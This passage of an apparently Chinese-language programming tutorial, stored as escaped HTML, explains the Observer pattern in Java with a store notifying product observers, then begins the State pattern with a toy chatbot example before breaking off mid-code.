&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有了分析上面那么多设计模式的经验，再看这里就会发现很明显的“通知”这个功能被多次重用，而且如果添加用户角色会更复杂，我们就可以用观察者模式，分离被观察者和观察者之间的耦合关系，让&lt;code>Store&lt;/code>不能直接引用&lt;code>Customer&lt;/code>和&lt;code>Admin&lt;/code>，相反，它引用一个&lt;code>ProductObserver&lt;/code>接口，任何人想要观察&lt;code>Store&lt;/code>，只要实现该接口，并且把自己注册到&lt;code>Store&lt;/code>即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Store&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">ProductObserver&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">observers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Product&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">products&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 注册观察者:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ProductObserver&lt;/span> &lt;span style="color:#111">observer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">observers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">observer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 取消注册:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">removeObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ProductObserver&lt;/span> &lt;span style="color:#111">observer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">observers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">observer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addNewProduct&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Product&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Product&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">products&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通知观察者:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">observers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPublished&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setProductPrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Product&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">products&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setPrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通知观察者:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">observers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPriceChanged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>就是这么一个小小的改动，使得观察者类型就可以无限扩充，而且，观察者的定义可以放到客户端：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// observer:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Admin&lt;/span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Admin&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Customer&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Customer&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// store:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Store&lt;/span> &lt;span style="color:#111">store&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Store&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 注册观察者:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">store&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">store&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>甚至可以注册匿名观察者：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">store&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ProductObserver&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onPublished&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Product&lt;/span> &lt;span style="color:#111">product&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[Log] on product published: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">product&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onPriceChanged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Product&lt;/span> &lt;span style="color:#111">product&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[Log] on product price changed: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">product&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903151100802.png" alt="image-20220903151100802">&lt;/p>
&lt;p>观察者模式也有很多变体形式。有的观察者模式把被观察者也抽象出接口（表示可以被观察 我觉得这个比较好理解）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ProductObservable&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 注意此处拼写是Observable不是Observer!
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ProductObserver&lt;/span> &lt;span style="color:#111">observer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">removeObserver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ProductObserver&lt;/span> &lt;span style="color:#111">observer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对应的实体被观察者就要实现该接口：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Store&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ProductObservable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有些观察者模式把通知变成一个Event对象，从而不再有多种方法通知，而是统一成一种（类似回调一样 onEvent）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ProductObserver&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onEvent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ProductEvent&lt;/span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>让观察者自己从Event对象中读取通知类型和通知数据。&lt;/p>
&lt;p>广义的观察者模式包括所有消息系统。所谓消息系统，就是把观察者和被观察者完全分离，通过消息系统本身来通知：&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903151459127.png" alt="image-20220903151459127">&lt;/p>
&lt;p>消息发送方称为Producer，消息接收方称为Consumer，Producer发送消息的时候，必须选择发送到哪个Topic。Consumer可以订阅自己感兴趣的Topic，从而只获得特定类型的消息。&lt;/p>
&lt;p>使用消息系统实现观察者模式时，Producer和Consumer甚至经常不在同一台机器上，并且双方对对方完全一无所知，因为注册观察者这个动作本身都在消息系统中完成，而不是在Producer内部完成。&lt;/p>
&lt;p>此外，注意到我们在编写观察者模式的时候，通知Observer是依靠语句：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">observers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPublished&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这说明各个观察者是依次获得的同步通知，如果上一个观察者处理太慢，会导致下一个观察者不能及时获得通知。此外，如果观察者在处理通知的时候，发生了异常，还需要被观察者处理异常，才能保证继续通知下一个观察者。&lt;/p>
&lt;h3 id="状态state">状态State&lt;/h3>
&lt;p>允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。&lt;/p>
&lt;p>如何表示状态？我们定义一个&lt;code>enum&lt;/code>就可以表示不同的状态。但不同的状态需要对应不同的行为，比如收到消息时：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">ONLINE&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 闪烁图标
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">BUSY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">reply&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;现在忙，稍后回复&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>状态模式的目的是为了把上述一大串&lt;code>if...else...&lt;/code>的逻辑给分拆到不同的状态类中，使得将来增加状态比较容易。&lt;/p>
&lt;p>例如，我们设计一个聊天机器人，它有两个状态：&lt;/p>
&lt;ul>
&lt;li>未连线；&lt;/li>
&lt;li>已连线。&lt;/li>
&lt;/ul>
&lt;p>对于未连线状态，我们收到消息也不回复：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">DisconnectedState&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">State&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bye!&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">reply&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于已连线状态，我们回应收到的消息：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ConnectedState&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">State&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello, I&amp;#39;m Bob.&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">reply&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Yes. &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
